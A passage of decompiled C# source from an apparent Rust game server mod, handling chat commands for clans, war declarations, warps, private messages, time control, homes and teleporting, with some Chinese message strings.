									@class.userData_0.Clan.FrendlyFire = true;
								}
								else if (Args[1].Equals("Y", StringComparison.OrdinalIgnoreCase))
								{
									@class.userData_0.Clan.FrendlyFire = true;
								}
								else if (Args[1].Equals("1", StringComparison.OrdinalIgnoreCase))
								{
									@class.userData_0.Clan.FrendlyFire = true;
								}
								else if (Args[1].Equals("NO", StringComparison.OrdinalIgnoreCase))
								{
									@class.userData_0.Clan.FrendlyFire = false;
								}
								else if (Args[1].Equals("OFF", StringComparison.OrdinalIgnoreCase))
								{
									@class.userData_0.Clan.FrendlyFire = false;
								}
								else if (Args[1].Equals("N", StringComparison.OrdinalIgnoreCase))
								{
									@class.userData_0.Clan.FrendlyFire = false;
								}
								else
								{
									if (!Args[1].Equals("0", StringComparison.OrdinalIgnoreCase))
									{
										Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.Help", null, @class.netUser_0, null));
										return;
									}
									@class.userData_0.Clan.FrendlyFire = false;
								}
								if (@class.userData_0.Clan.FrendlyFire)
								{
									Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.ToEnable", @class.userData_0.Clan, @class.netUser_0, null));
									return;
								}
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.ToDisable", @class.userData_0.Clan, @class.netUser_0, null));
								return;
							}
							break;
						case "WAR":
						case "HOSTILE":
						{
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null), 5f);
								return;
							}
							if (!@class.userData_0.Clan.Flags.Has(ClanFlags.can_declare))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.NoAvailable", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.NoValue", null, @class.netUser_0, null), 5f);
								return;
							}
							if ((clanData = Clans.Find(Args[1])) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.NoClan", @class.userData_0.Clan, @class.netUser_0, null).Replace("%CLAN_NAME%", Args[1]), 5f);
								return;
							}
							UserData userData3;
							if ((userData3 = Users.GetBySteamID(clanData.LeaderID)) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.NoLeader", @class.userData_0.Clan, @class.netUser_0, null).Replace("%CLAN_NAME%", clanData.Name), 5f);
								return;
							}
							if (@class.userData_0.Clan == clanData || !clanData.Flags.Has(ClanFlags.can_declare))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.CannotWar", @class.userData_0.Clan, @class.netUser_0, null).Replace("%CLAN_NAME%", clanData.Name), 5f);
								return;
							}
							if (@class.userData_0.Clan.Penalty > DateTime.Now || clanData.Penalty > DateTime.Now)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.CannotWar", @class.userData_0.Clan, @class.netUser_0, null).Replace("%CLAN_NAME%", clanData.Name), 5f);
								return;
							}
							if (@class.userData_0.Clan.Hostile.ContainsKey(clanData.ID))
							{
								Broadcast.Notice(@class.netUser_0, "✔", Config.GetMessageClan("Command.Clan.Hostile.InWar", @class.userData_0.Clan, @class.netUser_0, null).Replace("%CLAN_NAME%", clanData.Name), 5f);
								return;
							}
							if (Core.ChatQuery.ContainsKey(clanData.LeaderID))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.Query.Busy", @class.userData_0.Clan, @class.netUser_0, null).Replace("%CLAN_NAME%", clanData.Name), 5f);
								return;
							}
							string[] messagesClan6 = Config.GetMessagesClan("Command.Clan.Hostile.Declare", clanData, @class.netUser_0, @class.userData_0);
							string[] array = messagesClan6;
							for (int i = 0; i < array.Length; i++)
							{
								string text11 = array[i];
								if (!text11.Contains("%CLAN."))
								{
									Broadcast.MessageClan(@class.userData_0.Clan, text11);
								}
							}
							UserQuery userQuery3 = new UserQuery(userData3, Config.GetMessageClan("Command.Clan.Hostile.Query", @class.userData_0.Clan, @class.netUser_0, null), 10u);
							userQuery3.Answer.Add(new UserAnswer("Y*", "RustExtended.Clans.AcceptsWar", new object[]
							{
								@class.userData_0.Clan,
								clanData
							}));
							userQuery3.Answer.Add(new UserAnswer("N*", "RustExtended.Clans.DeclineWar", new object[]
							{
								@class.userData_0.Clan,
								clanData
							}));
							Core.ChatQuery.Add(clanData.LeaderID, userQuery3);
							NetUser netUser6 = NetUser.FindByUserID(clanData.LeaderID);
							if (netUser6 != null)
							{
								Broadcast.MessageClan(clanData, userQuery3.Query);
								Broadcast.Notice(netUser6, "?", userQuery3.Query, 5f);
								string[] messagesClan7 = Config.GetMessagesClan("Command.Clan.Hostile.Query.Comment", @class.userData_0.Clan, @class.netUser_0, null);
								array = messagesClan7;
								for (int i = 0; i < array.Length; i++)
								{
									string text12 = array[i];
									if (!text12.Contains("%CLAN."))
									{
										Broadcast.MessageClan(clanData, text12);
									}
								}
								return;
							}
							return;
						}
						case "HOUSE":
						{
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null), 5f);
								return;
							}
							if (!@class.userData_0.Clan.Flags.Has(ClanFlags.can_warp))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.House.NoAvailable", null, @class.netUser_0, null), 5f);
								return;
							}
							Vector3 position = @class.netUser_0.playerClient.controllable.character.transform.position;
							Collider[] array2 = Physics.OverlapSphere(position, 1f);
							for (int i = 0; i < array2.Length; i++)
							{
								Collider collider = array2[i];
								IDBase component = collider.gameObject.GetComponent<IDBase>();
								if (!(component == null) && component.idMain is StructureMaster && (component.idMain as StructureMaster).ownerID == @class.userData_0.SteamID)
								{
									@class.userData_0.Clan.Location = position;
									string[] messagesClan8 = Config.GetMessagesClan("Command.Clan.House.Success", @class.userData_0.Clan, @class.netUser_0, null);
									string[] array = messagesClan8;
									for (int j = 0; j < array.Length; j++)
									{
										string text13 = array[j];
										if (!text13.Contains("%CLAN."))
										{
											Broadcast.MessageClan(@class.userData_0.Clan, text13);
										}
									}
									return;
								}
							}
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.House.OnlyLeaderHouse", @class.userData_0.Clan, @class.netUser_0, null), 5f);
							return;
						}
						case "WARP":
						{
							if (!@class.userData_0.Clan.Flags.Has(ClanFlags.can_warp))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Warp.NoAvailable", null, @class.netUser_0, null), 5f);
								return;
							}
							if (@class.userData_0.Clan.Location == Vector3.zero)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Warp.NoClanHouse", @class.userData_0.Clan, @class.netUser_0, null), 5f);
								return;
							}
							if (Clans.WarpOutdoorsOnly)
							{
								Vector3 position2 = @class.netUser_0.playerClient.controllable.character.transform.position;
								Collider[] array2 = Physics.OverlapSphere(position2, 1f, 271975425);
								for (int i = 0; i < array2.Length; i++)
								{
									Collider component2 = array2[i];
									IDMain main = IDBase.GetMain(component2);
									if (!(main == null))
									{
										StructureMaster component3 = main.GetComponent<StructureMaster>();
										if (!(component3 == null) && component3.ownerID != @class.netUser_0.userID)
										{
											UserData bySteamID = Users.GetBySteamID(component3.ownerID);
											if (bySteamID == null || !bySteamID.HasShared(@class.netUser_0.userID))
											{
												Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Clan.Warp.NotHere", @class.netUser_0, null), 5f);
												return;
											}
										}
									}
								}
							}
							List<Countdown> list = Users.CountdownList(@class.userData_0.SteamID);
							if (predicate == null)
							{
								predicate = new Predicate<Countdown>(@class.method_1);
							}
							Countdown countdown = list.Find(predicate);
							if (countdown != null)
							{
								if (!countdown.Expired)
								{
									TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
									Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Clan.Warp.Countdown", @class.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}", timeSpan.Minutes, timeSpan.Seconds)), 5f);
									return;
								}
								Users.CountdownRemove(@class.userData_0.SteamID, countdown);
							}
							List<EventTimer> timer = Events.Timer;
							if (predicate2 == null)
							{
								predicate2 = new Predicate<EventTimer>(@class.method_2);
							}
							EventTimer eventTimer = timer.Find(predicate2);
							if (eventTimer != null && eventTimer.TimeLeft > 0.0)
							{
								Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Clan.Warp.Timewait", @class.netUser_0, null).Replace("%SECONDS%", eventTimer.TimeLeft.ToString()), 5f);
								return;
							}
							if (@class.userData_0.Clan.Level.WarpTimewait <= 0u)
							{
								Events.Teleport_ClanWarp(null, @class.netUser_0, @class.string_0, @class.userData_0.Clan);
								return;
							}
							eventTimer = Events.TimeEvent_ClanWarp(@class.netUser_0, @class.string_0, @class.userData_0.Clan.Level.WarpTimewait, @class.userData_0.Clan);
							if (eventTimer != null && eventTimer.TimeLeft > 0.0)
							{
								Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessageClan("Command.Clan.Warp.Prepare", @class.userData_0.Clan, @class.netUser_0, null).Replace("%SECONDS%", eventTimer.TimeLeft.ToString()), 5f);
								return;
							}
							return;
						}
						}
						Broadcast.Notice(@class.netUser_0.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", @class.string_0, @class.netUser_0), 5f);
					}
				}
				else if (@class.userData_0.Clan == null)
				{
					Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NotInClan", null, @class.netUser_0, null), 5f);
				}
				else
				{
					string[] messagesClan9 = Config.GetMessagesClan("Command.Clan.Info", @class.userData_0.Clan, @class.netUser_0, null);
					string[] array = messagesClan9;
					for (int i = 0; i < array.Length; i++)
					{
						string text14 = array[i];
						if (!text14.Contains("%CLAN."))
						{
							Broadcast.MessageClan(@class.netUser_0, text14);
						}
					}
				}
			}
		}

		public static void Clanlist(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			string[] messagesClan = Config.GetMessagesClan("Command.Clans.List", null, Sender, null);
			string[] array = messagesClan;
			for (int i = 0; i < array.Length; i++)
			{
				string text = array[i];
				if (text.Contains("%CLANS.LIST%"))
				{
					string text2 = text.Replace("%CLANS.LIST%", "");
					foreach (ClanData current in Clans.Database.Values)
					{
						string messageClan = Config.GetMessageClan("Command.Clans.Info", current, Sender, null);
						if (messageClan.Length > 30)
						{
							text2 = text2.Trim(new char[]
							{
								',',
								' '
							});
							if (text2.Length > 0)
							{
								Broadcast.Message(Sender, text2, null, 0f);
							}
							Broadcast.Message(Sender, messageClan, null, 0f);
							text2 = "";
						}
						else
						{
							text2 = text2 + messageClan + ", ";
							if (text2.Length > 60)
							{
								Broadcast.Message(Sender, text2.Trim(new char[]
								{
									',',
									' '
								}), null, 0f);
								text2 = "";
							}
						}
					}
					if (text2.Length > 0)
					{
						Broadcast.Message(Sender, text2.Substring(0, text2.Length - 2), null, 0f);
					}
				}
				else if (!text.Contains("%CLANS."))
				{
					Broadcast.Message(Sender, text, null, 0f);
				}
			}
		}

		public static void PM(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Args.Length < 2)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
			else
			{
				PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
				if (playerClient == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (playerClient.netUser == Sender)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PM.Self", Sender, null), 5f);
				}
				else if (Users.HasFlag(playerClient.netUser.userID, UserFlags.invis))
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else
				{
					Countdown countdown = Users.CountdownGet(Sender.userID, "mute");
					if (countdown != null)
					{
						if (!countdown.Expired)
						{
							TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
							string newValue = countdown.Expires ? string.Format("{0}:{1:D2}:{2:D2}", timeSpan.Hours, timeSpan.Minutes, timeSpan.Seconds) : "-:-:-";
							Broadcast.Notice(Sender, "☢", Config.GetMessage("Player.Muted", Sender, null).Replace("%TIME%", newValue), 5f);
							return;
						}
						Users.CountdownRemove(Sender.userID, countdown);
					}
					string[] array = Args;
					Array.Copy(Args, 1, array, 0, Args.Length - 1);
					Array.Resize<string>(ref array, array.Length - 1);
					Broadcast.ChatPM(Sender, playerClient.netUser, string.Join(" ", array));
					if (!Core.Reply.ContainsKey(playerClient.userID))
					{
						Core.Reply.Add(playerClient.userID, Sender);
					}
					else
					{
						Core.Reply[playerClient.userID] = Sender;
					}
				}
			}
		}

		public static void Reply(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else if (!Core.Reply.ContainsKey(Sender.userID))
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Reply.Nobody", Sender, null), 5f);
			}
			else
			{
				NetUser netUser = Core.Reply[Sender.userID];
				if (netUser == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, netUser.displayName), 5f);
				}
				else if (netUser == Sender)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PM.Self", Sender, null), 5f);
				}
				else
				{
					Countdown countdown = Users.CountdownGet(Sender.userID, "mute");
					if (countdown != null)
					{
						if (!countdown.Expired)
						{
							TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
							string newValue = countdown.Expires ? string.Format("{0}:{1:D2}:{2:D2}", timeSpan.Hours, timeSpan.Minutes, timeSpan.Seconds) : "-:-:-";
							Broadcast.Notice(Sender, "☢", Config.GetMessage("Player.Muted", Sender, null).Replace("%TIME%", newValue), 5f);
							return;
						}
						Users.CountdownRemove(Sender.userID, countdown);
					}
					Broadcast.ChatPM(Sender, netUser, string.Join(" ", Args));
					if (!Core.Reply.ContainsKey(netUser.userID))
					{
						Core.Reply.Add(netUser.userID, Sender);
					}
					else
					{
						Core.Reply[netUser.userID] = Sender;
					}
				}
			}
		}

		public static void Time(NetUser Sender, string Command, string[] Args)
		{
			if (Args == null || Sender == null || Args.Length <= 0 || !Sender.admin)
			{
				string str = (Commands.float_0 == 0f || Commands.float_1 == 0f) ? "" : " (冻结)";
				Broadcast.Message(Sender, "游戏时间: " + EnvironmentControlCenter.Singleton.sky.Cycle.DateTime.ToString("HH:mm") + str, null, 0f);
			}
			else
			{
				float time = -1f;
				if (!Args[0].Equals("freeze", StringComparison.OrdinalIgnoreCase))
				{
					if (Args[0].Equals("unfreeze", StringComparison.OrdinalIgnoreCase))
					{
						if (Commands.float_0 != 0f && Commands.float_1 != 0f)
						{
							env.daylength = Commands.float_0;
							Commands.float_0 = 0f;
							env.nightlength = Commands.float_1;
							Commands.float_1 = 0f;
							Broadcast.NoticeAll("☢", "游戏时间已经解冻.", null, 5f);
						}
					}
					else if (Args[0].Equals("day", StringComparison.OrdinalIgnoreCase))
					{
						EnvironmentControlCenter.Singleton.SetTime(12f);
						Broadcast.NoticeAll("☢", "时间已经冻结到 " + EnvironmentControlCenter.Singleton.sky.Cycle.DateTime.ToString("HH:mm") + " 小时(s).", null, 5f);
					}
					else if (Args[0].Equals("night", StringComparison.OrdinalIgnoreCase))
					{
						EnvironmentControlCenter.Singleton.SetTime(0f);
						Broadcast.NoticeAll("☢", "时间已经冻结到 " + EnvironmentControlCenter.Singleton.sky.Cycle.DateTime.ToString("HH:mm") + " 小时(s).", null, 5f);
					}
					else if (float.TryParse(Args[0], out time))
					{
						EnvironmentControlCenter.Singleton.SetTime(time);
						Broadcast.NoticeAll("☢", "时间已经冻结到 " + EnvironmentControlCenter.Singleton.sky.Cycle.DateTime.ToString("HH:mm") + " 小时(s).", null, 5f);
					}
					else
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender) + " 输入: /time [<hour>|day|night|freeze|unfreeze]", 5f);
					}
				}
				else if (Commands.float_0 == 0f && Commands.float_1 == 0f)
				{
					Commands.float_0 = env.daylength;
					env.daylength = 1E+09f;
					Commands.float_1 = env.nightlength;
					env.nightlength = 1E+09f;
					Broadcast.NoticeAll("☢", "游戏时间已经被冻结.", null, 5f);
				}
				else
				{
					env.daylength = Commands.float_0;
					Commands.float_0 = 0f;
					env.nightlength = Commands.float_1;
					Commands.float_1 = 0f;
					Broadcast.NoticeAll("☢", "游戏时间已经被解冻.", null, 5f);
				}
			}
		}

		public static void Position(NetUser Sender, UserData userData, string[] Args)
		{
			PlayerClient playerClient = Sender.playerClient;
			if (Args != null && Args.Length > 0 && Sender.admin)
			{
				playerClient = Helper.GetPlayerClient(Args[0]);
				if (playerClient == null)
				{
					Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
					return;
				}
			}
			Vector3 lastKnownPosition = playerClient.lastKnownPosition;
			string text = (playerClient.netUser != Sender) ? playerClient.netUser.displayName : "您的";
			Broadcast.Message(Sender, string.Concat(new string[]
			{
				text,
				" 位置: X: ",
				lastKnownPosition.x.ToString("0.00"),
				", Y: ",
				lastKnownPosition.y.ToString("0.00"),
				", Z: ",
				lastKnownPosition.z.ToString("0.00")
			}), null, 0f);
		}

		public static void Location(NetUser Sender, UserData userData, string[] Args)
		{
			PlayerClient playerClient = Sender.playerClient;
			if (Args != null && Args.Length > 0 && Sender.admin)
			{
				playerClient = Helper.GetPlayerClient(Args[0]);
				if (playerClient == null)
				{
					Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
					return;
				}
				userData = Users.GetBySteamID(playerClient.userID);
			}
			string str = (playerClient.netUser != Sender) ? playerClient.netUser.displayName : "You";
			string str2 = "World";
			if (userData.Zone != null)
			{
				str2 = userData.Zone.Name;
			}
			Broadcast.Message(Sender, str + " 在 \"" + str2 + "\" 地区.", null, 0f);
		}

		public static void Home(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			Commands.Class9 @class = new Commands.Class9();
			@class.netUser_0 = Sender;
			@class.string_0 = Command;
			int num = -1;
			if (Args != null && Args.Length > 0 && @class.netUser_0 != null && @class.netUser_0.admin)
			{
				UserData userData2 = Users.Find(Args[0]);
				if (userData2 == null)
				{
					Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", @class.netUser_0, Args[0]), 5f);
				}
				else
				{
					Vector3 lastKnownPosition = @class.netUser_0.playerClient.lastKnownPosition;
					List<Vector3> playerSpawns = Helper.GetPlayerSpawns(userData2.SteamID, false);
					if (playerSpawns.Count == 0)
					{
						Broadcast.Notice(@class.netUser_0, "✘", "玩家 \"" + userData2.Username + "\" 没有一个睡袋.", 5f);
					}
					else
					{
						if (Args.Length > 1 && int.TryParse(Args[1], out num))
						{
							num--;
							if (num < 0)
							{
								num = 0;
							}
							else if (num >= playerSpawns.Count)
							{
								num = playerSpawns.Count - 1;
							}
						}
						else
						{
							for (int i = 0; i < playerSpawns.Count; i++)
							{
								if (Vector3.Distance(lastKnownPosition, playerSpawns[i]) < 3f)
								{
									num = ++i;
								}
							}
							if (num < 0)
							{
								num = 0;
							}
							else if (num >= playerSpawns.Count)
							{
								num = 0;
							}
						}
						Broadcast.Notice(@class.netUser_0, "☢", string.Concat(new object[]
						{
							"你移动了 \"",
							userData2.Username,
							"\" 家里 home ",
							num + 1,
							" 的 ",
							playerSpawns.Count
						}), 5f);
						Helper.TeleportTo(@class.netUser_0, playerSpawns[num]);
					}
				}
			}
			else
			{
				Vector3 lastKnownPosition = @class.netUser_0.playerClient.lastKnownPosition;
				List<Vector3> playerSpawns = Helper.GetPlayerSpawns(@class.netUser_0.playerClient, true);
				if (playerSpawns.Count == 0)
				{
					Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageCommand("Command.Home.NoCamp", "", @class.netUser_0), 5f);
				}
				else
				{
					for (int j = 0; j < playerSpawns.Count; j++)
					{
						if (Vector3.Distance(lastKnownPosition, playerSpawns[j]) < 3f)
						{
							num = j++;
						}
					}
					if (Args != null && Args.Length > 0 && Args[0].Equals("LIST", StringComparison.OrdinalIgnoreCase))
					{
						string[] messages = Config.GetMessages("Command.Home.List", @class.netUser_0);
						for (int k = 0; k < messages.Length; k++)
						{
							string text = messages[k];
							if (!text.Contains("%HOME.NUM%") && !text.Contains("%HOME.POSITION%"))
							{
								Broadcast.Message(@class.netUser_0, Helper.ReplaceVariables(@class.netUser_0, text, null, "").Replace("%HOME.COUNT%", playerSpawns.Count.ToString()), null, 0f);
							}
							else
							{
								for (int l = 0; l < playerSpawns.Count; l++)
								{
									Broadcast.Message(@class.netUser_0, text.Replace("%HOME.NUM%", (l + 1).ToString()).Replace("%HOME.POSITION%", playerSpawns[l].AsString()), null, 0f);
								}
							}
						}
					}
					else
					{
						if (Core.CommandHomeOutdoorsOnly)
						{
							Vector3 position = @class.netUser_0.playerClient.controllable.character.transform.position;
							Collider[] array = Physics.OverlapSphere(position, 1f, 271975425);
							for (int m = 0; m < array.Length; m++)
							{
								Collider component = array[m];
								IDMain main = IDBase.GetMain(component);
								if (!(main == null))
								{
									StructureMaster component2 = main.GetComponent<StructureMaster>();
									if (!(component2 == null) && component2.ownerID != @class.netUser_0.userID)
									{
										UserData bySteamID = Users.GetBySteamID(component2.ownerID);
										if (bySteamID == null || !bySteamID.HasShared(@class.netUser_0.userID))
										{
											Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Home.NotHere", @class.netUser_0, null), 5f);
											return;
										}
									}
								}
							}
						}
						Countdown countdown = Users.CountdownList(userData.SteamID).Find(new Predicate<Countdown>(@class.method_0));
						if (countdown != null)
						{
							if (!countdown.Expired)
							{
								TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
								if (timeSpan.TotalHours > 0.0)
								{
									Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Home.Countdown", @class.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}:{2:D2}", timeSpan.TotalHours, timeSpan.Minutes, timeSpan.Seconds)), 5f);
									return;
								}
								if (timeSpan.TotalMinutes > 0.0)
								{
									Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Home.Countdown", @class.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}", timeSpan.Minutes, timeSpan.Seconds)), 5f);
									return;
								}
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Home.Countdown", @class.netUser_0, null).Replace("%TIME%", string.Format("{0}", timeSpan.Seconds)), 5f);
								return;
							}
							else
							{
								Users.CountdownRemove(userData.SteamID, countdown);
							}
						}
						EventTimer eventTimer = Events.Timer.Find(new Predicate<EventTimer>(@class.method_1));
						if (eventTimer != null && eventTimer.TimeLeft > 0.0)
						{
							Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Home.Wait", @class.netUser_0, null).Replace("%TIME%", eventTimer.TimeLeft.ToString()), 5f);
						}
						else
						{
							if (eventTimer != null)
							{
								eventTimer.Dispose();
								Events.Timer.Remove(eventTimer);
							}
							if (Args != null && Args.Length > 0 && int.TryParse(Args[0], out num))
							{
								num--;
							}
							if (num < 0)
							{
								num = 0;
							}
							else if (num >= playerSpawns.Count)
							{
								num = playerSpawns.Count - 1;
							}
							if (Economy.Enabled && Core.CommandHomePayment > 0uL)
							{
								UserEconomy userEconomy = Economy.Get(userData.SteamID);
								string newValue = Core.CommandHomePayment.ToString("N0") + Economy.CurrencySign;
								if (userEconomy.Balance < Core.CommandHomePayment)
								{
									Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Home.NoEnoughCurrency", @class.netUser_0, null).Replace("%PRICE%", newValue), 5f);
									return;
								}
							}
							eventTimer = Events.TimeEvent_HomeWarp(@class.netUser_0, @class.string_0, (double)Core.CommandHomeTimewait, playerSpawns[num]);
							if (eventTimer != null && eventTimer.TimeLeft > 0.0)
							{
								Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessageCommand("Command.Home.Start", "", @class.netUser_0).Replace("%TIME%", eventTimer.TimeLeft.ToString()), 5f);
							}
						}
					}
				}
			}
		}

		public static void Teleport(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			Predicate<Countdown> predicate = null;
			Predicate<EventTimer> predicate2 = null;
			Commands.Class10 @class = new Commands.Class10();
			@class.netUser_0 = Sender;
			@class.string_0 = Command;
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageCommand("Command.InvalidSyntax", @class.string_0, @class.netUser_0), 5f);
			}
			else
			{
				PlayerClient playerClient = @class.netUser_0.playerClient;
				Vector3 position = Vector3.zero;
				if (@class.netUser_0 != null && !@class.netUser_0.admin && !@class.string_0.Equals("tele", StringComparison.OrdinalIgnoreCase))
				{
					if (Core.CommandTeleportOutdoorsOnly)
					{
						Vector3 position2 = @class.netUser_0.playerClient.controllable.character.transform.position;
						Collider[] array = Physics.OverlapSphere(position2, 1f, 271975425);
						for (int i = 0; i < array.Length; i++)
						{
							Collider component = array[i];
							IDMain main = IDBase.GetMain(component);
							if (!(main == null))
							{
								StructureMaster component2 = main.GetComponent<StructureMaster>();
								if (!(component2 == null) && component2.ownerID != @class.netUser_0.userID)
								{
									UserData bySteamID = Users.GetBySteamID(component2.ownerID);
									if (bySteamID == null || !bySteamID.HasShared(@class.netUser_0.userID))
									{
										Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Teleport.NotHere", @class.netUser_0, null), 5f);
										return;
									}
								}
							}
						}
					}
					List<Countdown> list = Users.CountdownList(userData.SteamID);
					if (predicate == null)
					{
						predicate = new Predicate<Countdown>(@class.method_0);
					}
					Countdown countdown = list.Find(predicate);
					if (countdown != null)
					{
						if (!countdown.Expired)
						{
							TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
							if (timeSpan.TotalHours > 0.0)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.Countdown", @class.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}:{2:D2}", timeSpan.Hours, timeSpan.Minutes, timeSpan.Seconds)), 5f);
								return;
							}
							if (timeSpan.TotalMinutes > 0.0)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.Countdown", @class.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}", timeSpan.Minutes, timeSpan.Seconds)), 5f);
								return;
							}
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.Countdown", @class.netUser_0, null).Replace("%TIME%", string.Format("{0}", timeSpan.Seconds)), 5f);
							return;
						}
						else
						{
							Users.CountdownRemove(userData.SteamID, countdown);
						}
					}
					PlayerClient playerClient2;
					if ((playerClient2 = Helper.GetPlayerClient(Args[0])) == null)
					{
						Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", @class.netUser_0, Args[0]), 5f);
					}
					else if (playerClient == playerClient2)
					{
						Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.OnSelf", @class.netUser_0, null), 5f);
					}
					else
					{
						UserData bySteamID2 = Users.GetBySteamID(playerClient.userID);
						UserData bySteamID3 = Users.GetBySteamID(playerClient2.userID);
						if (bySteamID2 == null)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", playerClient.netUser, null), 5f);
						}
						else if (bySteamID3 == null)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", playerClient2.netUser, null), 5f);
						}
						else if (Core.ChatQuery.ContainsKey(playerClient2.userID))
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Player.ChatQuery.NotAnswer", playerClient2.netUser, null), 5f);
						}
						else
						{
							@class.string_0 = "tp";
							List<EventTimer> timer = Events.Timer;
							if (predicate2 == null)
							{
								predicate2 = new Predicate<EventTimer>(@class.method_1);
							}
							EventTimer eventTimer = timer.Find(predicate2);
							if (eventTimer != null && eventTimer.TimeLeft > 0.0)
							{
								Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Teleport.Already", playerClient.netUser, null).Replace("%TIME%", eventTimer.TimeLeft.ToString()), 5f);
							}
							else
							{
								if (Core.CommandTeleportOutdoorsOnly)
								{
									Vector3 position3 = playerClient2.controllable.character.transform.position;
									Collider[] array2 = Physics.OverlapSphere(position3, 1f, 271975425);
									for (int j = 0; j < array2.Length; j++)
									{
										Collider component3 = array2[j];
										IDMain main2 = IDBase.GetMain(component3);
										if (!(main2 == null))
										{
											StructureMaster component4 = main2.GetComponent<StructureMaster>();
											if (!(component4 == null) && component4.ownerID != @class.netUser_0.userID)
											{
												UserData bySteamID4 = Users.GetBySteamID(component4.ownerID);
												if (bySteamID4 == null || !bySteamID4.HasShared(@class.netUser_0.userID))
												{
